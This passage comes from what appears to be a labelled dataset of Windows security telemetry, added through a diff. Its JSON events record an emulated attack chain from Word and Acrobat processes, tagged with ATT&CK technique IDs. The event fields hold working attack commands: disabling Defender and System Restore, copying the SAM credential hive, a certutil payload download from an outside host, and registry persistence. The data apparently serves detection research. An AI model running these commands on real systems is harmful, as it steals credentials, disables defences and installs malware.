+        "Cmdline": "\"C:\\Windows\\system32\\mavinject.exe\" 6306 mca.gif",
+        "Type": "Process",
+        "Pid": 5468
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174191,
+    "label": "T1055.002_e5bcefee-262d-4568-a261-e8a20855ec81"
+}
+{
+    "srcNode": {
+        "UUID": "53f2fb2f-de87-5fbe-8add-52b5762c2773",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 19956,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "db002694-23e5-5044-a54c-757f178cd166",
+        "Name": "C:\\Users\\kelleytimothy\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\mca.gif.lnk",
+        "Type": "File"
+    },
+    "relation": "CreateFile",
+    "timestamp": 1655174191,
+    "label": "T1547.009_501af516bd8b24fee0c7c650ae5cc861"
+}
+{
+    "srcNode": {
+        "UUID": "53f2fb2f-de87-5fbe-8add-52b5762c2773",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 19956,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "47602646-dfa1-50d0-bf4c-c4a8d1afb758",
+        "Name": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\mca.gif.lnk",
+        "Type": "File"
+    },
+    "relation": "CreateFile",
+    "timestamp": 1655174191,
+    "label": "T1547.009_501af516bd8b24fee0c7c650ae5cc861"
+}
+{
+    "srcNode": {
+        "UUID": "53f2fb2f-de87-5fbe-8add-52b5762c2773",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 19956,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "47602646-dfa1-50d0-bf4c-c4a8d1afb758",
+        "Name": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\mca.gif.lnk",
+        "Type": "File"
+    },
+    "relation": "CloseFile",
+    "timestamp": 1655174191,
+    "label": "T1547.009_501af516bd8b24fee0c7c650ae5cc861"
+}
+{
+    "srcNode": {
+        "UUID": "53f2fb2f-de87-5fbe-8add-52b5762c2773",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 19956,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "e644b860-0254-5c32-b65e-2b650face4e2",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Set-ItemProperty \\\"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\\" -Name DisableAntiSpyware -Value 1\"",
+        "Type": "Process",
+        "Pid": 2172
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174191,
+    "label": "T1562.001_43e3334362b140924f001b256b229ee5"
+}
+{
+    "srcNode": {
+        "UUID": "e644b860-0254-5c32-b65e-2b650face4e2",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Set-ItemProperty \\\"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\\" -Name DisableAntiSpyware -Value 1\"",
+        "Type": "Process",
+        "Pid": 2172
+    },
+    "dstNode": {
+        "UUID": "7c42cc2b-31e3-5fe1-9b89-3191e75f1ce8",
+        "Key": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware",
+        "Type": "Registry"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655174193,
+    "label": "T1562.001_43e3334362b140924f001b256b229ee5"
+}
+{
+    "srcNode": {
+        "UUID": "e644b860-0254-5c32-b65e-2b650face4e2",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Set-ItemProperty \\\"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\\" -Name DisableAntiSpyware -Value 1\"",
+        "Type": "Process",
+        "Pid": 2172
+    },
+    "dstNode": {
+        "UUID": "7c42cc2b-31e3-5fe1-9b89-3191e75f1ce8",
+        "Key": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware",
+        "Type": "Registry",
+        "Value": "1"
+    },
+    "relation": "RegSetValue",
+    "timestamp": 1655174193,
+    "label": "T1562.001_43e3334362b140924f001b256b229ee5"
+}
+{
+    "srcNode": {
+        "UUID": "53f2fb2f-de87-5fbe-8add-52b5762c2773",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 19956,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "9045f8c5-0de1-51bc-96f4-17a3d51c172c",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Start-Process powershell.exe -WindowStyle hidden mca.gif\"",
+        "Type": "Process",
+        "Pid": 9076
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174260,
+    "label": "T1564.003_9a2edad4053a2b59fb9167a9bc29e7dc"
+}
+{
+    "srcNode": {
+        "UUID": "9045f8c5-0de1-51bc-96f4-17a3d51c172c",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Start-Process powershell.exe -WindowStyle hidden mca.gif\"",
+        "Type": "Process",
+        "Pid": 9076
+    },
+    "dstNode": {
+        "UUID": "c8599908-3759-5f14-a15a-70120f8ba738",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" mca.gif ",
+        "Type": "Process",
+        "Pid": 5880
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174261,
+    "label": "T1564.003_9a2edad4053a2b59fb9167a9bc29e7dc"
+}
+{
+    "srcNode": {
+        "UUID": "7ce2534d-1f68-50ab-99d7-2abc30ccd477",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 55017,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "3fd83eca-8743-5e75-8f7c-664b4dd8fc1d",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "cmd.exe /C finger base64_filedata@localhost",
+        "Type": "Process",
+        "Pid": 2192
+    },
+    "relation": "Process Create",
+    "timestamp": 1655181391,
+    "label": "T1105_1095434782a00c8a4772a11e625bcf5d"
+}
+{
+    "srcNode": {
+        "UUID": "13ae9bfe-abc1-570d-b0d3-06515f6243b4",
+        "Name": "finger.exe",
+        "Image": "C:\\Windows\\system32\\finger.exe",
+        "Cmdline": "finger  base64_filedata@localhost",
+        "Type": "Process",
+        "Pid": 7148
+    },
+    "dstNode": {
+        "UUID": "dc65319d-d978-5fb0-a1b2-cc79803e2249",
+        "Srcaddress": "srv-86.mcmillan-king.com",
+        "Dstaddress": "srv-86.mcmillan-king.com:finger",
+        "Port": "57314",
+        "Type": "Network"
+    },
+    "relation": "TCP Disconnect",
+    "timestamp": 1655181397,
+    "label": "T1105_1095434782a00c8a4772a11e625bcf5d"
+}
+{
+    "srcNode": {
+        "UUID": "13ae9bfe-abc1-570d-b0d3-06515f6243b4",
+        "Name": "finger.exe",
+        "Image": "C:\\Windows\\system32\\finger.exe",
+        "Cmdline": "finger  base64_filedata@localhost",
+        "Type": "Process",
+        "Pid": 7148
+    },
+    "dstNode": {
+        "UUID": "dc65319d-d978-5fb0-a1b2-cc79803e2249",
+        "Srcaddress": "srv-86.mcmillan-king.com",
+        "Dstaddress": "srv-86.mcmillan-king.com:finger",
+        "Port": "57315",
+        "Type": "Network"
+    },
+    "relation": "TCP Disconnect",
+    "timestamp": 1655181397,
+    "label": "T1105_1095434782a00c8a4772a11e625bcf5d"
+}
+{
+    "srcNode": {
+        "UUID": "7ce2534d-1f68-50ab-99d7-2abc30ccd477",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 55017,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "0c8fa102-1bdb-55fe-8162-59838ef928f4",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"write-host \\\"\\\"; $shadowlist = get-wmiobject win32_shadowcopy; $volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}; $maxvolume = ($volumenumbers | Sort-Object -Descending)[0]; $shadowpath = \\\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy\\\" + $maxvolume + \\\"\\Windows\\System32\\config\\SAM\\\"; $mydump = 4d30612a928faf7643b14bd85d8433cc.virus; [System.IO.File]::Copy($shadowpath , $mydump)\"",
+        "Type": "Process",
+        "Pid": 9784
+    },
+    "relation": "Process Create",
+    "timestamp": 1655181398,
+    "label": "T1003.002_5a484b65c247675e3b7ada4ba648d376"
+}
+{
+    "srcNode": {
+        "UUID": "0c8fa102-1bdb-55fe-8162-59838ef928f4",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"write-host \\\"\\\"; $shadowlist = get-wmiobject win32_shadowcopy; $volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}; $maxvolume = ($volumenumbers | Sort-Object -Descending)[0]; $shadowpath = \\\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy\\\" + $maxvolume + \\\"\\Windows\\System32\\config\\SAM\\\"; $mydump = 4d30612a928faf7643b14bd85d8433cc.virus; [System.IO.File]::Copy($shadowpath , $mydump)\"",
+        "Type": "Process",
+        "Pid": 9784
+    },
+    "dstNode": {
+        "UUID": "1b270d38-86b2-5ad9-96c6-8e530a5634cc",
+        "Name": "4d30612a928faf7643b14bd85d8433cc.virus",
+        "Type": "File"
+    },
+    "relation": "CloseFile",
+    "timestamp": 1655181400,
+    "label": "T1003.002_5a484b65c247675e3b7ada4ba648d376"
+}
+{
+    "srcNode": {
+        "UUID": "0c8fa102-1bdb-55fe-8162-59838ef928f4",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"write-host \\\"\\\"; $shadowlist = get-wmiobject win32_shadowcopy; $volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}; $maxvolume = ($volumenumbers | Sort-Object -Descending)[0]; $shadowpath = \\\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy\\\" + $maxvolume + \\\"\\Windows\\System32\\config\\SAM\\\"; $mydump = 4d30612a928faf7643b14bd85d8433cc.virus; [System.IO.File]::Copy($shadowpath , $mydump)\"",
+        "Type": "Process",
+        "Pid": 9784
+    },
+    "dstNode": {
+        "UUID": "1b270d38-86b2-5ad9-96c6-8e530a5634cc",
+        "Name": "4d30612a928faf7643b14bd85d8433cc.virus",
+        "Type": "File"
+    },
+    "relation": "SetBasicInformationFile",
+    "timestamp": 1655181400,
+    "label": "T1003.002_5a484b65c247675e3b7ada4ba648d376"
+}
+{
+    "srcNode": {
+        "UUID": "7ce2534d-1f68-50ab-99d7-2abc30ccd477",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 55017,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "b8f89df6-3430-54f0-854c-c7a6a8fe21c5",
+        "Name": "net.exe",
+        "Image": "C:\\Windows\\system32\\net.exe",
+        "Cmdline": "net  user guest /active:yes",
+        "Type": "Process",
+        "Pid": 6440
+    },
+    "relation": "Process Create",
+    "timestamp": 1655181401,
+    "label": "T1078.001_d0ca00832890baa1d42322cf70fcab1a"
+}
+{
+    "srcNode": {
+        "UUID": "7ce2534d-1f68-50ab-99d7-2abc30ccd477",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 55017,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "5d4e32c1-3940-5fd1-a5f8-2d2ca6313880",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "get-process | ?{$_.Description -like \"*virus*\"}; get-process | ?{$_.Description -like \"*carbonblack*\"}; get-process | ?{$_.Description -like \"*defender*\"}; get-process | ?{$_.Description -like \"*cylance*\"}",
+        "Type": "Process",
+        "Pid": 6764
+    },
+    "relation": "Process Create",
+    "timestamp": 1655181401,
+    "label": "T1518.001_b8453a5fe06b24aea12b27592d5c3d3a"
+}
+{
+    "srcNode": {
+        "UUID": "7ce2534d-1f68-50ab-99d7-2abc30ccd477",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 55017,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "0cbb1e0a-b227-5ce5-83d5-ff2fc5c45072",
+        "Name": "odbcconf.exe",
+        "Image": "C:\\Windows\\system32\\odbcconf.exe",
+        "Cmdline": "\"C:\\Windows\\system32\\odbcconf.exe\" /S /A LAMIRE",
+        "Type": "Process",
+        "Pid": 6268
+    },
+    "relation": "Process Create",
+    "timestamp": 1655181401,
+    "label": "T1055.001_a74bc239-a196-4f7e-8d5c-fe8c0266071c"
+}
+{
+    "srcNode": {
+        "UUID": "7ce2534d-1f68-50ab-99d7-2abc30ccd477",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 55017,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "36ffd6b0-f749-590e-b4e9-f082f79547c0",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Set-ItemProperty \\\"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\\\\" \\\"Shell\\\" \\\"explorer.exe, LAMIRE\\\" -Force\"",
+        "Type": "Process",
+        "Pid": 9748
+    },
+    "relation": "Process Create",
+    "timestamp": 1655181401,
+    "label": "T1547.004_aa147165f6c116cb0b0f944abe1db8ce"
+}
+{
+    "srcNode": {
+        "UUID": "36ffd6b0-f749-590e-b4e9-f082f79547c0",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Set-ItemProperty \\\"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\\\\" \\\"Shell\\\" \\\"explorer.exe, LAMIRE\\\" -Force\"",
+        "Type": "Process",
+        "Pid": 9748
+    },
+    "dstNode": {
+        "UUID": "116c9bc0-c21b-5cba-bd95-8bb135cdefaf",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell",
+        "Type": "Registry",
+        "Value": "LAMIRE"
+    },
+    "relation": "RegSetValue",
+    "timestamp": 1655181536,
+    "label": "T1547.004_aa147165f6c116cb0b0f944abe1db8ce"
+}
+{
+    "srcNode": {
+        "UUID": "36ffd6b0-f749-590e-b4e9-f082f79547c0",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Set-ItemProperty \\\"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\\\\" \\\"Shell\\\" \\\"explorer.exe, LAMIRE\\\" -Force\"",
+        "Type": "Process",
+        "Pid": 9748
+    },
+    "dstNode": {
+        "UUID": "116c9bc0-c21b-5cba-bd95-8bb135cdefaf",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell",
+        "Type": "Registry",
+        "Value": "LAMIRE"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655181536,
+    "label": "T1547.004_aa147165f6c116cb0b0f944abe1db8ce"
+}
+{
+    "srcNode": {
+        "UUID": "7ce2534d-1f68-50ab-99d7-2abc30ccd477",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 55017,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "76082f15-c9cd-55e8-b49f-2689b4518dcf",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "cmd.exe /C reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f",
+        "Type": "Process",
+        "Pid": 4752
+    },
+    "relation": "Process Create",
+    "timestamp": 1655181537,
+    "label": "T1490_c8f329d2847ede593b6cb4a1ec6120fb"
+}
+{
+    "srcNode": {
+        "UUID": "75e6080c-bd72-5876-9b75-6aff13a9ce85",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f ",
+        "Type": "Process",
+        "Pid": 5948
+    },
+    "dstNode": {
+        "UUID": "32b0740b-712b-5f7a-9c18-6ebc8e4c8cb5",
+        "Key": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableConfig",
+        "Type": "Registry"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655181605,
+    "label": "T1490_c8f329d2847ede593b6cb4a1ec6120fb"
+}
+{
+    "srcNode": {
+        "UUID": "ec61d06d-8245-52e5-938f-1d4de69c58a7",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f ",
+        "Type": "Process",
+        "Pid": 5700
+    },
+    "dstNode": {
+        "UUID": "e8dc914c-4a47-5c75-b144-007203222705",
+        "Key": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableSR",
+        "Type": "Registry",
+        "Value": "1"
+    },
+    "relation": "RegSetValue",
+    "timestamp": 1655181607,
+    "label": "T1490_c8f329d2847ede593b6cb4a1ec6120fb"
+}
+{
+    "srcNode": {
+        "UUID": "27284e64-8663-55fb-96e5-af499b01a885",
+        "Name": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32",
+        "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe",
+        "Cmdline": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe /N /T /O /H /P",
+        "Pid": 64039,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "bbcfc90d-0f14-5c53-97a8-0244a71eee44",
+        "Name": "certutil.exe",
+        "Image": "C:\\Windows\\system32\\certutil.exe",
+        "Cmdline": "certutil -urlcache -split -f http://alkimia-prod.com/nT0imyzmo/AjlCfXZ5ZHp6d2V7eXlhfXg= uuencode.exe.7392_1.19034.partial",
+        "Type": "Process",
+        "Pid": 5284
+    },
+    "relation": "Process Create",
+    "timestamp": 1655183680,
+    "label": "T1105_c76968acda4aa1673dadcd67f3ab7664"
+}
+{
+    "srcNode": {
+        "UUID": "bbcfc90d-0f14-5c53-97a8-0244a71eee44",
+        "Name": "certutil.exe",
+        "Image": "C:\\Windows\\system32\\certutil.exe",
+        "Cmdline": "certutil -urlcache -split -f http://alkimia-prod.com/nT0imyzmo/AjlCfXZ5ZHp6d2V7eXlhfXg= uuencode.exe.7392_1.19034.partial",
+        "Type": "Process",
+        "Pid": 5284
+    },
+    "dstNode": {
+        "UUID": "dd601f89-8b1f-53de-9683-1cfe90500ee2",
+        "Srcaddress": "DESKTOP-BA1RQFC.blueteam.com",
+        "Dstaddress": "117.18.237.29:http",
+        "Port": "60864",
+        "Type": "Network"
+    },
+    "relation": "TCP Send",
+    "timestamp": 1655183683,
+    "label": "T1105_c76968acda4aa1673dadcd67f3ab7664"
+}
+{
+    "srcNode": {
+        "UUID": "bbcfc90d-0f14-5c53-97a8-0244a71eee44",
+        "Name": "certutil.exe",
+        "Image": "C:\\Windows\\system32\\certutil.exe",
+        "Cmdline": "certutil -urlcache -split -f http://alkimia-prod.com/nT0imyzmo/AjlCfXZ5ZHp6d2V7eXlhfXg= uuencode.exe.7392_1.19034.partial",
+        "Type": "Process",
+        "Pid": 5284
+    },
+    "dstNode": {
+        "UUID": "dd601f89-8b1f-53de-9683-1cfe90500ee2",
+        "Srcaddress": "DESKTOP-BA1RQFC.blueteam.com",
+        "Dstaddress": "117.18.237.29:http",
+        "Port": "60864",
+        "Type": "Network"
+    },
+    "relation": "TCP Disconnect",
+    "timestamp": 1655183683,
+    "label": "T1105_c76968acda4aa1673dadcd67f3ab7664"
+}
+{
+    "srcNode": {
+        "UUID": "27284e64-8663-55fb-96e5-af499b01a885",
+        "Name": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32",
+        "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe",
+        "Cmdline": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe /N /T /O /H /P",
+        "Pid": 64039,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "997657d8-c76e-501d-a17e-1dda0c327136",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "cmd.exe /C dir /s /b %USERPROFILE%\\Favorites",
+        "Type": "Process",
+        "Pid": 7352
+    },
+    "relation": "Process Create",
+    "timestamp": 1655183685,
+    "label": "T1217_69bbe2183fa09c00ccaac62d48e214f8"
+}
+{
+    "srcNode": {
+        "UUID": "997657d8-c76e-501d-a17e-1dda0c327136",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "cmd.exe /C dir /s /b %USERPROFILE%\\Favorites",
+        "Type": "Process",
+        "Pid": 7352
+    },
+    "dstNode": {
+        "UUID": "45edaeeb-eaac-5b51-9f63-ed6b2ac8e402",
+        "Name": "C:\\Users\\qwarren\\Favorites",
+        "Type": "File"
+    },
+    "relation": "QueryDirectory",
+    "timestamp": 1655183717,
+    "label": "T1217_69bbe2183fa09c00ccaac62d48e214f8"
+}
+{
+    "srcNode": {
+        "UUID": "997657d8-c76e-501d-a17e-1dda0c327136",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "cmd.exe /C dir /s /b %USERPROFILE%\\Favorites",
+        "Type": "Process",
+        "Pid": 7352
+    },
+    "dstNode": {
+        "UUID": "d4358dd4-1c1d-5a39-8c58-fc2b0023cf17",
+        "Name": "C:\\Users\\qwarren\\Favorites\\Links",
+        "Type": "File"
+    },
+    "relation": "QueryDirectory",
+    "timestamp": 1655183717,
+    "label": "T1217_69bbe2183fa09c00ccaac62d48e214f8"
+}
+{
+    "srcNode": {
+        "UUID": "27284e64-8663-55fb-96e5-af499b01a885",
+        "Name": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32",
+        "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe",
+        "Cmdline": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe /N /T /O /H /P",
+        "Pid": 64039,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "3078e54b-fd3f-53cd-86f7-589636d78d0c",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level\" /t REG_DWORD /d 1 /f",
+        "Type": "Process",
+        "Pid": 3472
+    },
+    "relation": "Process Create",
+    "timestamp": 1655183978,
+    "label": "T1137_12ad9edefc86af07700fbf49bfdac6ba"
+}
+{
+    "srcNode": {
+        "UUID": "27284e64-8663-55fb-96e5-af499b01a885",
+        "Name": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32",
+        "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe",
+        "Cmdline": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe /N /T /O /H /P",
+        "Pid": 64039,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "4ec6e787-1037-5291-a594-e3f102752794",
+        "Name": "C:\\Users\\qwarren\\AppData\\Roaming\\Microsoft\\Outlook\\VbaProject.OTM",
+        "Type": "File"
+    },
+    "relation": "WriteFile",
+    "timestamp": 1655183978,
+    "label": "T1137_12ad9edefc86af07700fbf49bfdac6ba"
+}
+{
+    "srcNode": {
+        "UUID": "3078e54b-fd3f-53cd-86f7-589636d78d0c",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level\" /t REG_DWORD /d 1 /f",
+        "Type": "Process",
+        "Pid": 3472
+    },
+    "dstNode": {
+        "UUID": "69d653d3-bc4c-571c-8c7e-97dd2598a98f",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level",
+        "Type": "Registry"
+    },
+    "relation": "RegCloseKey",
+    "timestamp": 1655183987,
+    "label": "T1137_12ad9edefc86af07700fbf49bfdac6ba"
+}
+{
+    "srcNode": {
+        "UUID": "27284e64-8663-55fb-96e5-af499b01a885",
+        "Name": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32",
+        "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe",
+        "Cmdline": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe /N /T /O /H /P",
+        "Pid": 64039,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "a38bc476-a5b7-5246-8cb9-31dd55a1b2fb",
+        "Name": "rundll32.exe",
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
